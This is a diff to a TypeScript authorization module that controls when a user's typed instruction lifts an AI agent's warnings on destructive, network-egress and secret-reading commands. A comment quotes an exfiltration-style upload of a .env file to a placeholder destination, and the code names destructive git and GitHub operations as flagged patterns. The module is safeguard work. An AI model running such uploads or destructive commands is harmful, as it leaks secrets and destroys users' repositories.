@@ -1,11 +1,11 @@
 // bridge/src/handler/authorization.ts
 
-// Instruction-scoped authorization (§5.4). A lift is derived ONLY from the text a
+// Instruction-scoped authorization. A lift is derived ONLY from the text a
 // human typed into `handler:instruct` — the PA bar and the preset chips both funnel
 // through `HandlerEngine.instruct`, and that method is the single feed point. Never
 // the transcript, never judge/Assistant output: those are attacker-influenced, and an
 // agent that could authorize itself by writing "the user approved this" into its own
-// output would turn the advisory floor (§5.1) into decoration.
+// output would turn the advisory floor into decoration.
 //
 // Two grades, because "the user named this operation" and "the user named this
 // target" are different claims:
@@ -13,7 +13,7 @@
 //   literal lift — ABS_PATH and egress hosts, keyed by the exact string. Naming one
 //                  path outside the project must not open the filesystem; naming one
 //                  host must not open the network.
-// HARD (§5.3) is liftable by nothing at all.
+// HARD is liftable by nothing at all.
 
 import { classifyDestructive, isInsideProject, type FloorWarning } from "./destructive-floor";
 
@@ -26,10 +26,46 @@ export interface InstructionAuthorization {
   readonly hosts: Set<string>;
 }
 
+/**
+ * The floor tiers a PATTERN lift can silence. ABS_PATH takes a literal lift
+ * instead (`paths`), and HARD takes none at all.
+ */
+export type LiftedTier = "DESTRUCTIVE" | "EGRESS" | "SECRETS";
+
+export interface LiftedOperation {
+  /**
+   * Which advisory this lift silences. Carried rather than dropped because the
+   * three tiers are three unlike permissions — a command that destroys, one that
+   * sends data out, one that reads a secret — and a summary that calls them all
+   * "commands" tells the user the wrong one was granted.
+   */
+  readonly tier: LiftedTier;
+  /** The operation spelled the way it was named. */
+  readonly matched: string;
+}
+
 export interface GrantSummary {
   patterns: string[];
+  /**
+   * The same operations `patterns` stand for, spelled the way they were named.
+   * A pattern is a regex source: it is the only stable key a lift can hang on,
+   * and it is also the one thing that can never be put in front of a user — so
+   * the readable half is carried out beside it rather than reconstructed by a
+   * caller that would have to re-derive it from the floor.
+   *
+   * Deduped, so an alias whose command trips two floor patterns reads as the one
+   * operation the user named.
+   */
+  operations: LiftedOperation[];
   paths: string[];
   hosts: string[];
+  /**
+   * The subset of `hosts` a summary may repeat back. `hosts` is a deliberate
+   * superset (see BARE_HOST) that only ever has to agree with itself across
+   * granting and checking; this half is what a user is shown, so it holds only
+   * the tokens that can be nothing but a destination.
+   */
+  destinations: string[];
 }
 
 // An instruction is free text of unbounded length, and these sets live for the whole
@@ -46,8 +82,14 @@ interface Alias {
 // The floor's patterns are COMMAND-shaped and an instruction is natural language, so
 // scanning "force push branch" with the floor regexes matches nothing — a lift derived
 // from that scan alone would be dead code that still passes its own tests. This table
-// closes the gap for the four operations §5.2 can actually prepare a snapshot for,
-// which are also the ones a user routinely names in prose.
+// closes the gap for the floor operations a user routinely names in prose.
+//
+// That deliberately reaches past the operations snapshot.ts can prepare a snapshot for,
+// to the outward ones (a merge, a publish, a force branch delete) that nothing can.
+// Without a row here their advisory recurs every pass and buildDecidePrompt feeds it
+// back as a reason to escalate, so the merge the backlog exists to land never lands. A
+// lift there buys silence on the advisory and nothing else — never an undo, because
+// none exists.
 //
 // It stays narrow and demands specific phrasing, because the two failure directions are
 // not symmetric: a MISSING lift costs one advisory row in the activity feed, while a
@@ -62,12 +104,20 @@ interface Alias {
 // product-development vocabulary: "add a hard reset button to the settings screen",
 // "add a force delete confirmation dialog", "recursively delete stale LRU entries".
 // None of those asks for anything to happen to the repo or the disk, and a lift
-// granted from one silently suppresses every §5.1 advisory row for the rest of the
+// granted from one silently suppresses every advisory row for the rest of the
 // session — the failure this table is least able to afford.
 const REPO_ANCHOR = String.raw`\b(?:git|repo|repository|branch|commit|HEAD|origin|upstream|working\s+tree)\b`;
 // No "cache" — "force remove the row from the cache" is in-memory prose, and the
 // filesystem sense always spells itself "cache dir"/"cache directory" anyway.
 const FS_ANCHOR = String.raw`\b(?:dirs?|directory|directories|folders?|files?|node_modules|build|dist|out|target|coverage|vendor|artifacts?)\b`;
+// A bare `#\d+` is NOT an arm: GitHub numbers issues and pull requests in one series
+// and "closes #42" is the standard idiom for an ISSUE, so anchoring on the number alone
+// grants `gh pr close`/`gh pr merge` from the single most common line in a backlog.
+// `PR #42` still anchors — on the `PR`.
+const PR_ANCHOR = String.raw`(?:\bPRs?\b|\bpull\s+requests?\b)`;
+// Its own anchor rather than REPO_ANCHOR, which also accepts git/repo/commit — "delete
+// the old git config files" would otherwise grant a force branch delete.
+const BRANCH_ANCHOR = String.raw`\bbranch(?:es)?\b`;
 
 /** An anchored phrase, in either order — prose puts the anchor on either side. */
 function anchored(phrase: string, anchor: string, gap = 40): RegExp[] {
@@ -112,21 +162,72 @@ const ALIASES: Alias[] = [
     ],
     command: "git clean -fd",
   },
+  {
+    phrases: [
+      // Not before `conflict`: "fix the merge conflicts on PR #12" is the most common
+      // sentence in a backlog carrying both the verb and the anchor, and it asks for the
+      // opposite of a merge — the PR is not ready to land.
+      ...anchored(
+        String.raw`\b(?:squash[\s-]?|rebase[\s-]?)?merg(?:e|es|ed|ing)\b(?!\s*conflicts?\b)`,
+        PR_ANCHOR,
+      ),
+      /\bgh\s+pr\s+merge\b/i,
+    ],
+    command: "gh pr merge 1",
+  },
+  {
+    phrases: [
+      ...anchored(String.raw`\bclos(?:e|es|ed|ing)\b`, PR_ANCHOR),
+      /\bgh\s+pr\s+close\b/i,
+    ],
+    command: "gh pr close 1",
+  },
+  {
+    // FORCE phrasing only. Plain "delete the branch after merging" is the prose for
+    // `git branch -d`, which the floor does not flag at all, so lifting the forced
+    // spelling from it would be exactly the spurious grant this table cannot afford.
+    // The literal arm is case-sensitive for the same reason the floor pattern is.
+    phrases: [
+      ...anchored(String.raw`\bforce[\s-]?delet(?:e|es|ed|ing)\b`, BRANCH_ANCHOR),
+      /\bgit\s+branch\s+-D\b/,
+    ],
+    command: "git branch -D topic",
+  },
+  {
+    phrases: [
+      /\bnpm\s+publish\b/i,
+      /\bpublish(?:es|ed|ing)?\b[^\n]{0,24}\b(?:to\s+)?npm\b/i,
+    ],
+    command: "npm publish",
+  },
+  // No prose alias for `gh release delete`, `gh repo delete` or `git tag -d`: the
+  // English for each is arguable ("delete the release notes", "drop the old tags"),
+  // and a user who types the literal command in the PA bar is already lifted by the
+  // floor-scan half of authorizeInstruction.
 ];
 
 // ABS_PATH is excluded rather than incidentally absent: an alias grants an operation,
 // and a canonical command that ever grew a path must not hand out a literal lift.
-export const ALIAS_LIFTS: { phrases: RegExp[]; patterns: string[] }[] = ALIASES.map((a) => ({
+export const ALIAS_LIFTS: {
+  phrases: RegExp[];
+  lifts: { pattern: string; tier: LiftedTier }[];
+  command: string;
+}[] = ALIASES.map((a) => ({
   phrases: a.phrases,
-  patterns: classifyDestructive(a.command, "")
-    .warnings.filter((w) => w.tier !== "ABS_PATH")
-    .map((w) => w.pattern),
+  // Carried through for the grant summary: an alias fires on prose, and the
+  // canonical command is the only readable spelling of what it granted.
+  command: a.command,
+  lifts: classifyDestructive(a.command, "").warnings.flatMap((w) =>
+    w.tier === "ABS_PATH" || w.tier === "HARD" ? [] : [{ pattern: w.pattern, tier: w.tier }]),
 }));
 
 const URL_AUTHORITY = /\b[a-z][a-z0-9+.-]*:\/\/([^\s/?#'"<>]+)/gi;
 // Dotted names with an alphabetic final label. A filename like `dump.json` reads as a
 // host here; that is symmetric across granting and checking, so it costs nothing beyond
 // the odd unlifted warning. IPv6 literals are not recognized at all — same cost.
+// Nothing built from this set may be REPORTED — naming a source file is the commonest
+// thing a user types, and a summary reading it back as a network permission would be
+// false on most instructions. `GrantSummary.destinations` is the half that is shown.
 const BARE_HOST = /\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,63})\b/gi;
 const IPV4 = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
 
@@ -134,11 +235,11 @@ function normalizeHost(h: string): string {
   return h.split("@").pop()!.replace(/:\d+$/, "").replace(/\.$/, "").toLowerCase();
 }
 
+// Built ON destinationsIn rather than beside it, so "the subset" below stays a
+// fact about the code and not a claim two lists have to keep agreeing on.
 function hostsIn(text: string): Set<string> {
-  const out = new Set<string>();
-  for (const m of text.matchAll(URL_AUTHORITY)) out.add(normalizeHost(m[1]!));
+  const out = destinationsIn(text);
   for (const m of text.matchAll(BARE_HOST)) out.add(normalizeHost(m[1]!));
-  for (const m of text.matchAll(IPV4)) out.add(m[0]!);
   return out;
 }
 
@@ -159,8 +260,11 @@ function normalizePath(p: string): string {
     .replace(/[.,;!?)\]]+$/, "");
 }
 
-function grant(into: Set<string>, value: string): void {
-  if (into.size < MAX_LITERALS) into.add(value);
+/** Whether this call is the one that granted `value` — a repeat grants nothing new. */
+function grant(into: Set<string>, value: string): boolean {
+  if (into.has(value) || into.size >= MAX_LITERALS) return false;
+  into.add(value);
+  return true;
 }
 
 // Both halves of the grant read an instruction as if every clause in it ASKED for
@@ -169,6 +273,22 @@ function grant(into: Set<string>, value: string): void {
 // to be written about a dangerous command is the one telling Handler not to run it.
 const PROHIBITION =
   /\b(?:never|not|don't|doesn't|didn't|won't|can't|cannot|shouldn't|mustn't|avoid(?:s|ing)?|refrain|instead\s+of|rather\s+than)\b/i;
+
+// The other polarity a clause can carry, and the one an instruction only started
+// carrying once a sentence could take an earlier one back: withdrawal. "actually
+// skip the force push" holds no word above, so the alias table read it as a
+// request and the feed said out loud that the user had permitted a force push for
+// the session — the inverse of what they wrote — while silencing the advisory for
+// every pass after it.
+//
+// Over-filtering is the safe direction here, so this is deliberately loose: a
+// clause wrongly read as a countermand costs one unlifted advisory row, and a
+// missed one costs a session-wide grant nobody asked for. "scratch" is the one
+// exception, pinned to its idiom — bare, it is a noun that turns up inside the
+// very paths a grant is about (`/etc/scratch/notes`), which is a false match on
+// the word rather than a wrong reading of the sentence.
+const COUNTERMAND =
+  /\b(?:skip(?:s|ped|ping)?|cancel(?:s|led|ling|ed|ing)?|drop(?:s|ped|ping)?|forget|scratch\s+(?:that|it)|undo|stop|no\s+longer|take\s+(?:that|it)\s+back)\b/i;
 
 // Clause-level, not sentence-level: "delete the build dir, but never touch
 // node_modules" has to keep its first half. Rejoined with newlines because every floor
@@ -180,7 +300,7 @@ const PROHIBITION =
 function grantableClauses(text: string): string {
   return text
     .split(/(?<=[.!?])\s+|[;\n]+|\s+but\s+/i)
-    .filter((clause) => !PROHIBITION.test(clause))
+    .filter((clause) => !PROHIBITION.test(clause) && !COUNTERMAND.test(clause))
     .join("\n");
 }
 
@@ -204,16 +324,31 @@ export function authorizeInstruction(
   // Every grant below reads the PERMITTED clauses, never the raw text: a prohibition
   // names the same command a request does, and only the polarity tells them apart.
   const asked = grantableClauses(text);
-  // floor.hard is ignored, not consulted: §5.3 has no lift, so naming one of those
+  // floor.hard is ignored, not consulted: HARD has no lift, so naming one of those
   // commands in an instruction must leave no trace here.
   const floor = classifyDestructive(asked, projectPath);
+  const operations: LiftedOperation[] = [];
+  const seen = new Set<string>();
+  const note = (tier: LiftedTier, matched: string) => {
+    // Injective without a separator byte either field could contain — the same rule
+    // destructive-floor.ts states for its own warning key.
+    const key = JSON.stringify([tier, matched]);
+    if (seen.has(key)) return;
+    seen.add(key);
+    operations.push({ tier, matched });
+  };
   for (const w of floor.warnings) {
     if (w.tier === "ABS_PATH") grant(auth.paths, normalizePath(w.matched));
-    else grant(auth.patterns, w.pattern);
+    // The matched span, not the whole clause: a pattern lift is a claim about an
+    // OPERATION, and the sentence around it named a target the lift did not grant.
+    else if (w.tier !== "HARD" && grant(auth.patterns, w.pattern)) note(w.tier, w.matched);
   }
   for (const lift of ALIAS_LIFTS) {
     if (lift.phrases.some((re) => re.test(asked))) {
-      for (const p of lift.patterns) grant(auth.patterns, p);
+      // The table's canonical command rather than the prose that fired it: "force
+      // push the branch" is what the user wrote, and `git push --force` is what
+      // they can now expect to see run.
+      for (const l of lift.lifts) if (grant(auth.patterns, l.pattern)) note(l.tier, lift.command);
     }
   }
   // Harvested from the whole instruction rather than only from an egress match: the user
@@ -222,10 +357,14 @@ export function authorizeInstruction(
   for (const h of hostsIn(asked)) grant(auth.hosts, h);
 
   const added = <T>(set: Set<T>, n: number) => [...set].slice(n);
+  const destinations = destinationsIn(asked);
+  const hosts = added(auth.hosts, before.h);
   return {
     patterns: added(auth.patterns, before.p),
+    operations,
     paths: added(auth.paths, before.f),
-    hosts: added(auth.hosts, before.h),
+    hosts,
+    destinations: hosts.filter((h) => destinations.has(h)),
   };
 }
 
@@ -256,9 +395,9 @@ function namesTargetOutsideProject(flaggedText: string, projectPath: string): bo
  *
  * The egress target claim fails CLOSED. An upload whose destination cannot be resolved
  * to a literal — `curl -T .env "$EXFIL"` — has named no host the user could have
- * authorized, so the operation lift does not stand on its own: §5.4 exists precisely so
- * that naming one host does not open the network, and an unparseable destination is the
- * one the user is least likely to have meant.
+ * authorized, so the operation lift does not stand on its own: the host lift is
+ * literal precisely so that naming one host does not open the network, and an
+ * unparseable destination is the one the user is least likely to have meant.
  */
 export function isAuthorized(
   auth: InstructionAuthorization, w: FloorWarning, flaggedText: string, projectPath: string,
@@ -286,8 +425,8 @@ export function isAuthorized(
 
 /**
  * Split rather than filter. An authorized action carries no warning — the user already
- * said to do it — but it is still snapshotted (§5.4), so the authorized list has to
- * survive the call site for the §5.2 snapshot pass to read.
+ * said to do it — but it is still snapshotted, so the authorized list has to
+ * survive the call site for the snapshot pass to read.
  */
 export function partitionWarnings(
   auth: InstructionAuthorization, warnings: FloorWarning[], flaggedText: string,
